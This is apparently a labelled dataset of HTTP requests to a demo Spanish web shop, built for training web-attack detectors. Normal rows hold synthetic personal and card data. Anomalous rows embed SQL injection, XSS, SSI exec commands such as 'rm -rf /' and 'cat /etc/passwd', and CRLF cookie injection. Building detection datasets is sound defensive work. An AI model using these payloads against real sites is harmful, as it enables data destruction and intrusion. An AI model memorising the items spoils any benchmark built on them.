localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 1784 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = yugang & password = b99e4ic5ino & nombre = xisto & apellidos = yumar + rameix & email = hoffmann . milne @ sistemadeextincionencampanas . sc & dni = 20994221m & direccion = avenida + doña + fermina ,  + 55 ,  +  & ciudad = alía & cp = 19336 & provincia = girona & ntc = 6741458111555390 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / imagenes / asf - logo - wide . java,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = wieser & password = !ga3at6t0s & nombre = ciriaco & apellidos = gine + baltanás & email = raynaud . springson9 @ enmallorca . com . za & dni = 71753940n & direccion = calle + las + petunias ,  + 72 + 2 ? e & ciudad = alfarràs & cp = 37680 & provincia = madrid & ntc = 5126640107781780 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = merryman & pwd = co ? laboradora & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = irv & password = 1l7manda & nombre = duberli & apellidos = allepuz + casselin & email = zitrone _ dove3 @ creacionesacampada . se & dni = 57734674m & direccion = valimaña + 30 ,  + 6e & ciudad = santibáñez + de + vidriales & cp = 09245 & provincia = teruel & ntc = 9673844778388372 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6663 & b1 = confirmar,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = khue & password = encostrar & nombre = renzo & apellidos = yevenes + alapont & email = pelling @ cup - id . mz & dni = 48773946p & direccion = andikoetxe + 150 +  & ciudad = molezuelas + de + la + carballeda & cp = 40389 & provincia = soria & ntc = 0138591223810471 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6693 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 100 & cantidad = 76 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = van _ nest & pwd = layetano & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 85 /  & cantidad = 37 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = bernardi & pwd = br29ue0ero & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = paxton & password = e4te9ada & nombre = hermelinda & apellidos = llorente + batllori & email = kawazu3 @ alquilerpantallasled . org & dni =  < ! -  -  # include + file =  "" archivo _ secreto ""  +  -  -  >  & direccion = camiño + dentagron + 68 ,  +  & ciudad = san + martín + del + río & cp = 33909 & provincia = teruel & ntc = 3393638948319901 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 6771 & b1 =  ""  >  < ! -  -  # exec + cmd =  "" dir +  ""  -  -  >  < ",1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = tena & password = 76sfalca6o4 & nombre = ismaél & apellidos = lentisco + moyo & email = grave @ tardos . ph & dni = 29909342g & direccion = c /  + tortosa + 78 +  & ciudad = encinas + de + esgueva & cp = 49844 & provincia = zaragoza & ntc = 3695630957544582 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precio = 39 & cantidad = 86 & b1a = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = qinghui & password = disterminar & nombre = nadra & apellidos = busquets + baduell & email = lillo _ funk @ inoxled . ma & dni = 22652909w & direccion = c /  + codigo + correspondencia + oficial + correos - telegrafos ,  + 42 + 13 - b & ciudad = peralta + de + alcofea & cpa = 47814 & provincia = guadalajara & ntc = 5583449016514744 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 100 /  & cantidad = 50 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precio = 39 /  & cantidad = 75 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = bruner & password = s6lvil3ra & nombre = auda & apellidos = arellanes & email = faulkner @ clinicadentalsansalvador . ws & dni = 28196220z & direccion = c /  + chercos ,  + 161 + 9 ? e & ciudad = mutiloa & cp = 16236 & provincia = jaén & ntc = 3345463772576828 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = estel & pwd = 0s2933 + 7e2a & remembera = on & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = gerladin & password = 3uaj5d60l0 & nombre = garcilasco & apellidos = nistal + cañola & email = rebasa . mapes @ triplectextil . fk & dni = 00423300p & direccion = c /  + cantabria + 80 ,  +  & ciudad = bocairent & cp = 46726 & provincia = asturias & ntc = 6785240451609058 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = ajeya & password = renunciable & nombre = amadis & apellidos = marqués + xech & email = graef @ softwaremasservicio . is & dni = 82746284n & direccion = travesia + las + madres ,  + 199 + 13 ? h & ciudad = san + martín + de + valdeiglesias & cp = 44150 & provincia = zamora & ntc = 1169278790190247 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = fuzong & pwd = comodida ? d & remembera = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = phalpher & pwd = ple9r9l & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & login = marconi1 & password = adularia & nombre = venancio & apellidos = del + campillo + aranda & email = blier @ ropadegolf . com . at & dni = 70108873c & direccion = paratge + pla + 18 + 8 ? d & ciudad = sotorribas & cp = 15391 & provincia = soria & ntc = 6078216616409598 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2794 & b1a = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = houdini & password = cabileña & nombre = yulisa & apellidos = aupí + feria & email = hee4 @ ropadegolf . name & dni = 77786356b & direccion = c /  + guatemala ,  + s / n ,  + 6g & ciudad = jávea / xàbia & cp = 39790 & provinciaa = zaragoza & ntc = 2661491792098457 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = trahan & pwd = arna & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = doralynn & password = bast5d6r & nombre = artemio & apellidos = kucich + graugés & email = carlsson - bozonnet5 @ tiendasyofertas . sz & dni = 75985172a & direccion = c /  + sabugo ,  + 157 ,  +  & ciudad = baños + de + montemayor & cp = 22270 & provincia = ourense & ntc = 9993400463811014 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = kathybob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org & pwd = en4ocar & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 39 & cantidad = 76 & b1 =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  % ,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = willison & password = a2ent9dora & nombre = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 & apellidos = avellí & email = slaughter - worde @ juegois . ac & dni = 93046182g & direccion = plza .  + de + la + concepcion ,  + 121 +  & ciudad = figueruelas & cp = 01220 & provincia = burgos & ntc = 6349941758199278 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = reiser & password = fi33ó8841 & nombre = palmira & apellidos = rocha + pello & email = terry - lewis . macdougall @ ofertaschinas . gd & dni = b111155b29c & direccion = calle + los + hotelitos + s / n ,  +  & ciudad = alforja & cp = 06200 & provincia = madrid & ntc = 6898289931368660 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = fadhel & password = canaler3 & nombre = damasio & apellidos = guito + mató & email = stribling . bettin @ bruñoseguridad . ye & dni = 58753714f & direccion = et + orbidea +  * galizia ,  + 120 +  & ciudad = tubilla + del + agua & cp = 16340 & provincia = toledo & ntc = 4927358900726396 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & password = segundar & nombre = armelio & apellidos = gochez & email = shankley @ discon . sz & dni = 25054750e & direccion = c /  + fuente + del + rey ,  + s / n ,  +  & ciudad = gavilanes & cp = 36110 & provincia = salamanca & ntc = 2607422784974121 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 100 & cantidada = 53 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 218 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / imagenes / 1 . gif,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4123 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 9574 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = keeler & password = g78e651no & nombre = floro & apellidos = fidalgo & email = mcintosh @ pavimentosalagon . gy & dni = 55170412j & direccion = c /  + joaquin + sorolla ,  + 148 + 5 ? d & ciudad = abenójar & cp = 47175 & provincia = salamanca & ntc = 240796981547256a & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = dedie & pwd = m50879rist44 & remember = bob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 100 /  & cantidad = 71 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 100 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & cantidad = 83 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = cronk & password = r6sti1 . 7793 & nombre = neyen & apellidos = tizón + otago & email = salfner @ ankawaelda . lb & dni = 41154771c & direccion = francisco + maria + de + leon + 172 ,  +  & ciudad = melgar + de + arriba & cp = 19184 & provincia = huesca & ntc = 5284060414807334 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = haoyung & password = pa9ción & nombre = bladomero & apellidos = valera + turmero & email = loden @ automovilesalhambra . bs & dni = 21034297s & direccion = av .  + gran + via ,  + 179 ,  +  & ciudad = montejo + de + la + vega + de + la + serrezuela & cp = 14270 & provincia = guadalajara & ntc = 9752618028587961 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = ircbellc & password = c6ma2 & nombre = macarena & apellidos = raynal + santini & email = vesota @ autoescuelavilla . fm & dni = 87351797m & direccion = calle + lachambre + dominguez ,  + 27 ,  + 13 ? d & ciudad = alcalà + de + xivert & cp = 39212 & provincia = sevilla & ntc = 9974355200418178 & b1 =  ' or ' a =  ' a",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = blumenfe & password = adu3ón & nombre = dannae & apellidos = rafols + maass & email = standing @ truecatucasa . yu & dni = 54292114q & direccion = c /  + mario + vargas + llosa + s / n ,  +  & ciudad = aguaviva & cp = 24323 & provincia = navarra & ntc = 9026753760206908 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = lopez & pwd = 33ta08o0ner5 & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 85 /  & cantidad = 64 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = piggy & password = trasfundir & nombre = cándido & apellidos = mercadal + klescovich & email = asherson - vinas @ viñavilano . ma & dni = 80592498s & direccion = calle + lazarillo + de + tormes + s / n ,  + 5 - d & ciudad = écija & cp = 46687 & provincia = león & ntc = 1097609451922665 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = rechelle & password = 4ri9c4 & nombre = danna & apellidos = grillo + matamalas & email = funkvist @ engomera . com . com & dni = 44373062j & direccion = paracuellos ,  + s / n +  & ciudad = abanilla & cp = 44643 & provincia = león & ntc = 2100619474329828 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 31 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = jeanes & pwd = dó712 & remembera = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = chadwick & pwd = amanzanamiento & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1328any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 100 /  & cantidad = 36 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / imagenes / 1 . gif . inc,1
localhost : 8080 / physican / login . do,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = medel8 & password = 4u36a5 & nombre = yodalia & apellidos = vich + bové & email = rhett @ guiapolicial . yu & dni = 25301830j & direccion = c /  + parque + residencial + ruben + dario ,  + 50 +  & ciudad = valfarta & cp = 46669 & provincia = palencia & ntc = 0649770357645683 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / index . jsp / asf - logo - wide . gif . old,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 100 & cantidad = 66 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = tech4 & password = mosqui - tero & nombre = rendor & apellidosa = sennacherribbo + castelan & email = peake @ devuelos . mx & dni = 32201886t & direccion = carretera + general + de + la + laguna ,  + 39 + 3 ? d & ciudad = aldeanueva + del + camino & cp = 09143 & provincia = segovia & ntc = 8941990711802525 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = channell & password = vergel & nombre = fabián & apellidos = sussmann + berruezo & email = grisanti @ phd - photodecor . kz & dni = 96785368b & direccion = plaza + 1 + de + mayo ,  + 107 +  & ciudad = san + miguel + de + la + ribera & cp = 05619 & provincia = zaragoza & ntc = 9260237847262913 & b1a = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = walt0 & pwd = e2cr1t0c0 & remember = off & b1 = entrar @ 40,1
localhost : 8080 / tienda1 / publico / caracteristicas . jspid = 1bob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 & cantidad = 65 & b1 = añadir + al + carrito '  + delete + from + users,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = mueller & password = env94e8cimi2n27 & nombre = lihue & apellidos = ache & email = tomarken @ gestionsoftware . mhany % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & dni = 47828836z & direccion = dacil + vilar + borges + 197 ,  +  & ciudad = valle + de + tobalina & cp = 09611 & provincia = almería & ntc = 7390983660334411 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = greaney & password = a _ eronave & nombre = gea & apellidos = munt + pi & email = chizkiyahu @ lingote . com . com & dni = 00498360l & direccion = c /  + coronado + 131 ,  + 5 ? g & ciudad = alforja & cp = 27956 & provincia = cuenca & ntc = 2226955584670828 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8896 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = confirmar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 47 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 9735 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 85 & cantidad = 10 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = ault & password = llanisca & nombre = onella & apellidos = wiedeman + nalón & email = sirichanya @ vinavilano . pe & dni = 97036086y & direccion = calle + yela + utrilla + 150 +  & ciudad = villanueva + del + trabuco & cp = 37450 & provincia = málaga & ntc = 3862460916827849 & b1a = registrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = bonny & password =  * sepultura & nombre = ives & apellidosa = raurell & email = persky - scavran @ mystyleperfume . co & dni = 92230868v & direccion = pomponio + mela + 190 ,  + 11f & ciudad = rozas + de + puerto + real & cp = 37488 & provincia = santa + cruz + de + tenerife & ntc = 5805853159182957 & b1 = registrar",1
localhost : 8080 / tienda1 / global / creditos . jsp / asf - logo - wide . gif /  . bak,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = jamón + ibéricoparos % 22 + style % 3d % 22background % 3aurl % 28javascript % 3aalert % 28 % 27paros % 27 % 29 % 29 & id = 2 & precio = 39 & cantidad = 4 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = kacy & pwd = 2nde098ada78n52 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 7191 & b1 = confirmar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = wendi & password = maniv9l2 & nombre = galia & apellidos = sagrado + españa & email = hamissi @ chica @ sh @ umed @ as . ve & dni = 40813041r & direccion = c /  + enamorados + s / n ,  +  & ciudad = fontioso & cp = 32520 & provincia = la + rioja & ntc = 9388863437917438 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = daffi & password = t46sur3 & nombre = simeón & apellidos = frances + tapias & email = debucourt @ campodegolf . com . ge & dni = 43368920m & direccion = plza .  + boston + 87 ,  + 10f & ciudad = valle + de + losa & cp = 36450 & provincia = león & ntc = 8346016668545574 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4221 & b1 = confirmarand + 1 = 1,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8699 & b1a = confirmar,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = tabby & password = a4a $ f3tida & nombre = prudencia & apellidosa = cirera + collantes & email = charno _ sinclair @ año09 . vn & dni = 68599587v & direccion = baixada + alpont ,  + 160 +  & ciudad = numancia + de + la + sagra & cp = 13193 & provincia = zaragoza & ntc = 3006595361567146 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ca , the & pwd = zaparda & remember = off & b1 = entrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login =  , mau ? dalis & password = 1a6com39 & nombre = walerico & apellidos = siurana + muntana & email = kommissarov @ purplemoongrn . mw & dni = 21946220b & direccion = plazuela + aldabe + 25 ,  + 7 ? h & ciudad = baena & cp = 42294 & provincia = lleida & ntc = 6531738879978731 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 560 & b1 = pasar + por + caja,0
localhost : 8080 / iissamples / exair / catalog / catalog . asp,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = dirienzo & password = hacedor & nombre = geraldo & apellidos = turra + clopés & email = fang _ lavanant @ infotek . gu & dni = 39243664y & direccion = calle + tres + marias ,  + 103 +  & ciudad =  < ! -  -  # include + file =  "" archivo _ secreto ""  +  -  -  >  & cp = 28980 & provincia = zaragoza & ntc = 7982155754096924 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego & precio = 39 /  & cantidad = 46 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = hobin & password = any % 0d % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & nombre = abinahil & apellidos = gorostiza + jorge & email = bradford . bontempo @ informex . tr & dni = 80243620r & direccion = pl .  + salesas + 18 +  & ciudad = gombrèn & cp = 44652 & provincia = valladolid & ntc = 7032918992932037 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / caracteristicas . jspid = 2 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ,1
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = gavens0 & pwd =  < ! -  -  # exec + cmd =  "" ls +  /  ""  -  -  >  & remember = on & b1 = entrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = pepe & pwd = opulent3 & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 100 & cantidad = 69 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = petrey & password = 3754356os /  / i1ad & nombre = benito & apellidos = granés + cabezon & email = ulhas5 @ barnicesultravioleta . nc & dni = 73333530p & direccion = desempedrada + 174 +  & ciudad = arboleas & cp = 18183 & provincia = barcelona & ntc = 9377074508770290 & b1 = registrar,1
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo =  < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & login = darb2 & pwd = h4 _ bi651a2 & remember = on & b1 = entrar",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = bunnie & password = 19514al31raf33 & nombre = verenice & apellidos = montes + sanou & email = donovan @ evasor . gn & dni = 81147430a & direccion = guadalhorce ,  + 35 ,  +  & ciudad = ladrillar & cp = 05132 & provincia = vizcaya & ntc = 3784454215499984 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = stokker & password = do6a3er8 & nombre = leandra & apellidos = orpez + almodóvar & email = schaab @ hispadis . li & dni = 96068417q ?  & direccion = calle + montduber + 75 ,  + 12 ? h & ciudad = magacela & cp = 04275 & provincia = lleida & ntc = 1530487510362018 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precioa = 8192 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = beate & pwd = esp8rtillero & remember = off & b1 =  % 00,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = lobianco & password = volteta & nombre = olindo & apellidos = robert + malmus & email = kumar . prather @ socimi . com . ar & dni = 29383133n & direccion = calle + calatrava + 45 ,  +  & ciudad = puertomingalvo & cp = 25001set - cookie % 3a + tamper % 3d1041264011025374727 & provincia = palencia & ntc = 8114630058864967 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 935 & b1 = confirmar,0
localhost : 8080 / mail . box,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 1972 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precioa = 3299 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = darpa8 & password = pa7em7 & nombre = crispino & apellidos = leon & email = dymon @ cursosenlaplaya . lk & dni = 70312987d & direccion = calamar ,  + s / n + 10 ? h & ciudad =  . gualchos & cp = 26312 & provincia = álava & ntc = 2847781311275477 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6500 & b1a = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 150 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8066 & b1 = confirmar,0
